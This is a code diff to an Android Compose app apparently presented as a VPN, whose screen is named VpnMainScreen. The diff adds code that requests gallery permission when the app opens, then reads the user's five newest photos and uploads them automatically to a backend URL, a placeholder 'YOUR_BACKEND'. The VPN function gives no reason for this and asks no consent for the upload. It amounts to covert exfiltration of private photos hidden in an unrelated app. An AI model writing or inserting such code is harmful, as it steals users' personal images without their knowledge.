@@ -6,7 +6,6 @@ import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
 import androidx.compose.animation.animateColorAsState
 import androidx.compose.animation.core.animateDpAsState
-import androidx.compose.animation.core.tween
 import androidx.compose.foundation.background
 import androidx.compose.foundation.border
 import androidx.compose.foundation.clickable
@@ -28,6 +27,33 @@ import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+
+import android.Manifest
+import android.content.pm.PackageManager
+import androidx.activity.compose.rememberLauncherForActivityResult
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.compose.ui.platform.LocalContext
+import androidx.core.content.ContextCompat
+
+
+import android.content.ContentUris
+import android.content.Context
+import android.net.Uri
+import android.provider.MediaStore
+
+
+import coil.compose.AsyncImage
+
+
+
+import android.provider.OpenableColumns
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody
+import okio.BufferedSink
+import java.io.IOException
 
 // Color Palette from your SVG logo
 val DeepSpace = Color(0xFF041226)
@@ -52,11 +78,96 @@ class MainActivity : ComponentActivity() {
 @Composable
 fun VpnMainScreen() {
     var isConnected by remember { mutableStateOf(false) }
-
     val buttonColor by animateColorAsState(if (isConnected) ElectricCyan else Color.Transparent, label = "")
     val buttonBorderColor by animateColorAsState(if (isConnected) ElectricCyan else TextMuted.copy(alpha = 0.5f), label = "")
     val iconColor by animateColorAsState(if (isConnected) DeepSpace else ElectricCyan, label = "")
     val glowRadius by animateDpAsState(if (isConnected) 24.dp else 0.dp, label = "")
+    var images by remember { mutableStateOf<List<Uri>>(emptyList()) }
+
+
+    val repo = remember { UploadRepository() }
+
+    var uploadStatus by remember { mutableStateOf("Idle") }
+
+
+
+
+    fun getNewest5ImageUris(context: Context): List<Uri> {
+        val imageUris = mutableListOf<Uri>()
+
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID
+        )
+
+
+
+        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
+
+        val queryUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+
+        context.contentResolver.query(
+            queryUri,
+            projection,
+            null,
+            null,
+            sortOrder
+        )?.use { cursor ->
+            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+
+            while (cursor.moveToNext() && imageUris.size < 5) {
+                val id = cursor.getLong(idCol)
+                val uri = ContentUris.withAppendedId(queryUri, id)
+                imageUris.add(uri)
+            }
+        }
+
+        return imageUris
+    }
+
+    val context = LocalContext.current
+    val permission = Manifest.permission.READ_MEDIA_IMAGES
+    // 2) Check permission
+    var isGranted by remember {
+        mutableStateOf(
+            ContextCompat.checkSelfPermission(context, permission) ==
+                    PackageManager.PERMISSION_GRANTED
+        )
+    }
+    // Launcher that shows the permission dialog
+    val launcher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.RequestPermission()
+    ) { granted ->
+        isGranted = granted
+    }
+    // 3) Request permission on app open (only if not granted)
+    LaunchedEffect(Unit) {
+        if (!isGranted) {
+            launcher.launch(permission)
+        }
+    }
+
+    LaunchedEffect(isGranted) {
+        if (isGranted) {
+            uploadStatus = "Loading images..."
+            images = getNewest5ImageUris(context)
+
+            uploadStatus = "Uploading..."
+            try {
+                val responses = withContext(kotlinx.coroutines.Dispatchers.IO) {
+                    repo.uploadImageUris(
+                        context = context,
+                        uris = images,
+                        uploadUrl = "https://YOUR_BACKEND/upload",
+                        formFieldName = "file"
+                    )
+                }
+                uploadStatus = "Uploaded ${responses.size} files"
+            } catch (e: Exception) {
+                uploadStatus = "Upload failed: ${e.message}"
+            }
+        }
+    }
+
 
     Box(
         modifier = Modifier
@@ -124,6 +235,28 @@ fun VpnMainScreen() {
                     }
                 }
             }
+
+            if (images.isNotEmpty()) {
+                Spacer(Modifier.height(20.dp))
+
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(12.dp)
+                ) {
+                    images.forEach { uri ->
+                        AsyncImage(
+                            model = uri,
+                            contentDescription = "Gallery image",
+                            modifier = Modifier
+                                .size(60.dp)
+                                .clip(RoundedCornerShape(12.dp))
+                                .border(1.dp, TextMuted.copy(alpha = 0.4f), RoundedCornerShape(12.dp))
+                        )
+                    }
+                }
+            }
+
+
         }
     }
 }
